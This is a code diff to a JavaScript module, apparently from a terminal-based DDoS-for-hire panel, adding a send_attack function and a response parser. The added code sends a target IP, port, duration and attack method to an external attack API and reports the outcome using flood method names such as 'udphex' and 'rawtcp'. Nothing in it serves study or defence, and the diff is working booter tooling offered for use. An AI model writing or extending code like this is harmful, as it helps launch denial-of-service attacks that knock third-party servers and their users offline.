@@ -101,3 +101,26 @@ exports.set_TerminalSize = function(row, col, socket) {
 exports.set_Title = function(t, socket) {
     socket.write("\033]0;" + t + "\700");
 }
+
+exports.send_attack = async function(ip, port, time, method, usr) {
+    let response = "";
+    let rreturn = await(await fetch(Config.API_1 + ip + "&port=" + port + "&time=" + time + "&type=" + method)).text();
+    console.log(rreturn);
+    response += "API 1: " + await eExtra.get_api_response(rreturn) + "\r\n";
+    return response;
+}
+
+exports.get_api_response = function(rpn) {
+    let new_res = rpn.toLowerCase();
+    if(new_res.includes("attack sent") || new_res.includes("udphex") || new_res.includes("std") || new_res.includes("rawtcp") || new_res.includes("attack initalized")) {
+        return "Attack Sent";
+    } else if(new_res.includes("invalid key") || new_res.includes("key is invalid")) {
+        return "Error, Invalid Key";
+    } else if(new_res.includes("invalid method") || new_res.includes("method is invalid") || new_res.includes("method does not exist") || new_res.includes("method doesn't exist")) {
+        return "Error, Invalid Method";
+    } else if(new_res.includes("error when connecting to the server if the problem")) { //CUSTOM (REMOVE LATER)
+        return "Error, Either all fields aren't set or invalid method!";
+    } else {
+        return "Error, Something went wrong catching attack response!";
+    }
+}
